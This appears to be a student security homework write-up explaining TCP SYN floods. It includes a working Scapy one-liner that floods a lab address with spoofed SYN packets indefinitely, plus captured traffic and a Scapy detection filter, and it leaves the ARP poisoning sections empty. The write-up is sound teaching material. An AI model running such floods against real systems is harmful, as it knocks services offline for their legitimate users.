# MIE-SIB. Homework #1. 

### Theoretical overview

###### TCP/SYN Packet (TCP/SYN Flood)

A **SYN flood** is a form of denial-of-service attack in which an attacker sends a succession of SYN requests to a target's system in an attempt to consume enough server resources to make the system unresponsive to legitimate traffic.

Normally when a client attempts to start a TCP connection to a server, the client and server exchange a series of messages which normally runs like this:

1. The client requests a connection by sending a SYN (synchronize) message to the server.
2. The server acknowledges this request by sending SYN-ACK back to the client.
3. The client responds with an ACK, and the connection is established.

This is called the **TCP three-way handshake**, and is the foundation for every connection established using the TCP protocol.

![Normal work](http://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/Tcp_normal.svg/220px-Tcp_normal.svg.png)

A **SYN flood attack** works by not responding to the server with the expected ACK code. The malicious client can either simply not send the expected ACK, or by spoofing the source IP address in the SYN, causing the server to send the SYN-ACK to a falsified IP address - which will not send an ACK because it "knows" that it never sent a SYN.

The server will wait for the acknowledgement for some time, as simple network congestion could also be the cause of the missing ACK, but in an attack increasingly large numbers of half-open connections will bind resources on the server until no new connections can be made, resulting in a denial of service to legitimate traffic. Some systems may also malfunction badly or even crash if other operating system functions are starved of resources in this way.

![SYN Flood](http://upload.wikimedia.org/wikipedia/commons/thumb/9/94/Tcp_synflood.png/220px-Tcp_synflood.png)


### 1. Using Scapy for performing attacks.

###### TCP/SYN Flood.

	send(IP(src=RandIP('10.0.0.0/8'), dst='172.16.16.16')/TCP(sport=RandShort(), dport=80), loop=1) 

Scapy generates TCP SYN packets at a constant rate to the victim with address 172.16.16.16 on port 80, sourced from random spoofed addresses within the allowed management network (10.0.0.0/8). Appending the loop=1 parameter to scapy's send() command instructs it to regenerate and retransmit the packet at a constant rate indefinitely. 

On the victim router, we can see that the TCP connection queue is immediately exhausted: 

	02:15:49.007776 IP 10.183.157.9.35319 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.008966 IP 10.143.122.81.61439 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.010057 IP 10.23.145.69.45972 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.011082 IP 10.36.20.15.23697 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.012211 IP 10.237.52.92.34983 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.013442 IP 10.37.190.76.20831 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.014706 IP 10.36.141.23.4999 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.015997 IP 10.200.164.146.33124 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.017994 IP 10.131.175.162.38615 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.019118 IP 10.46.64.11.48947 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.020234 IP 10.133.81.101.52032 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.021436 IP 10.253.244.76.18717 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.022464 IP 10.66.75.205.27219 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.023491 IP 10.202.188.247.11763 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.024614 IP 10.82.193.102.54673 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.025861 IP 10.150.235.34.29320 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.027553 IP 10.231.145.11.58377 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.029261 IP 10.145.105.136.60844 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0

###### ARP Poisoning.

	
### 2. Using Scapy for detecting attacks.

###### TCP/SYN Flood.

We can easily capture **tcp** packets with **"S" flag**:


	a= sniff(filter="tcp[tcpflags] & (tcp-syn) != 0")
	a.nsummary()

Displayed information:
	
	0000 Ether / IP / TCP 10.86.233.36:25701 > 172.16.16.16:www S
	0001 Ether / IP / TCP 10.155.28.58:56047 > 172.16.16.16:www S
	0002 Ether / IP / TCP 10.79.88.202:60566 > 172.16.16.16:www S
	0003 Ether / IP / TCP 10.95.55.197:64929 > 172.16.16.16:www S
	0004 Ether / IP / TCP 10.177.194.62:1856 > 172.16.16.16:www S
	0005 Ether / IP / TCP 10.236.101.170:21069 > 172.16.16.16:www S
	0006 Ether / IP / TCP 10.236.110.58:16205 > 172.16.16.16:www S
	0007 Ether / IP / TCP 10.40.112.40:63280 > 172.16.16.16:www S
	0008 Ether / IP / TCP 10.216.122.157:16823 > 172.16.16.16:www S
	0009 Ether / IP / TCP 10.66.169.3:60749 > 172.16.16.16:www S
	0010 Ether / IP / TCP 10.61.157.51:48726 > 172.16.16.16:www S
	0011 Ether / IP / TCP 10.73.11.92:55115 > 172.16.16.16:www S
	0012 Ether / IP / TCP 10.115.49.253:23161 > 172.16.16.16:www S

###### ARP Poisoning.